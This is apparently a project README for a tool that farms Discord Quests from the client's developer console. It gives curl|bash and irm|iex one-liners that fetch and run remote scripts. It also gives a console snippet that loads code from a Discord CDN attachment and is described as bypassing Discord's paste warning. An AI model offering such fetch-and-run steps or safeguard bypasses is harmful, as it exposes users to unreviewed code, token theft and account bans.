<div align="center">
  <h1>🎮 DiscordQuestEngine 🚀</h1>
  <p><b>Automate Discord Quest progress tracking and completion with a single script!</b></p>
  <p><i>Clean, direct, and hassle-free quest farming right from your Discord Console.</i></p>

  <a href="https://www.instagram.com/aayushchouhan_24/">
    <img src="https://img.shields.io/badge/Follow_me_on_Instagram-%23E4405F.svg?style=for-the-badge&logo=Instagram&logoColor=white" alt="Instagram" />
  </a>
</div>

---

## 🌟 Highlights

- **Parallel Processing:** Run multiple quests concurrently! No more waiting for them one by one.
- **Console Native:** Runs directly from Discord's DevTools. No weird external executables required.
- **Smart Hooks:** Seamlessly hooks into Discord's internal streaming and game detection logic.
- **Easy Unlock:** Ships with quick scripts to unlock your Developer Tools on Windows, macOS, and Linux.

---

## 🛠️ Step 1: Unlock Discord Developer Tools

By default, Discord hides the Developer Tools. Choose your platform below to set it free!

### 🪄 The Easy Way (Use the provided scripts)

Run the script for your OS. It automatically backs up your `settings.json`, enables the DevTools flag, and helps you restart Discord!

#### 🟦 Windows
**How to open:** Press `Win + R`, type `powershell`, and hit Enter (or search for "PowerShell" in the Start menu).
Then, run this command:
```powershell
irm "https://raw.githubusercontent.com/aayushchouhan24/DiscordQuestEngine/refs/heads/main/win/unlock-devtools.ps1" | iex
```

#### 🍏 macOS
**How to open:** Press `Cmd + Space`, type `Terminal`, and hit Enter.
Then, run this command:
```bash
curl -sSL "https://raw.githubusercontent.com/aayushchouhan24/DiscordQuestEngine/refs/heads/main/mac/unlock-devtools.sh" | bash
```

#### 🐧 Linux
**How to open:** Press `Ctrl + Alt + T` (on most distributions) or search for "Terminal" in your applications.
Then, run this command:
```bash
curl -sSL "https://raw.githubusercontent.com/aayushchouhan24/DiscordQuestEngine/refs/heads/main/linux/unlock-devtools.sh" | bash
```

---

## 🚀 Step 2: How to Run the Engine

1. Open Discord.
2. Press `Ctrl + Shift + I` (or `Cmd + Option + I` on Mac) to open **Developer Tools**.
3. Navigate to the **Console** tab at the top.

### ✨ Method A: Quick Load Snippet
Paste and run this snippet in the Console. Since the file is hosted on Discord's own CDN, it bypasses the security block!

```js
fetch('https://cdn.discordapp.com/attachments/828955596417531925/1511164159453036717/engine.js?ex=6a1f74cb&is=6a1e234b&hm=f8f91887ff2ea7ae6293f5cfb368aece819750f72ffe4a93a25f9ae12dc7bda4&')
  .then(r => r.text())
  .then(code => {
    const blob = new Blob([code], {type: 'text/javascript'});
    import(URL.createObjectURL(blob));
  })
```
> ⚠️ **Note:** Discord CDN links can expire. If this snippet stops working, use Method B below.

### 📝 Method B: Manual Copy & Paste
If the quick link expires, or you prefer loading it locally:
1. **Copy the code** from the [`QuestEngine/engine.js`](QuestEngine/engine.js) file in this repository.
2. **Paste the code** into the Discord Console and press `Enter`.

🎉 **That's it!** Watch the UI pop up, select your quests, and hit **Run Selected** (or **Run All**)!

---

## ⚠️ Disclaimer & Safety

- **Educational Purposes Only:** This project is created strictly for educational purposes, security research, and proof-of-concept demonstrations.
- **Not Affiliated:** This project is not affiliated, associated, authorized, endorsed by, or in any way officially connected with Discord Inc., or any of its subsidiaries or its affiliates.
- **Read the Code:** Never paste code into your console unless you trust the source or understand what it does.
- **ToS / Rules:** Automating Discord action may violate Discord's Terms of Service. The author cannot be held responsible for any account bans, suspensions, or other actions taken against your account. Use this entirely at your own risk!

---

### ❤️ Author

**Aayush Chouhan**  
⭐ If this tool saved you time, don't forget to **Star** the repository and drop a follow on [Instagram](https://www.instagram.com/aayushchouhan_24/)!
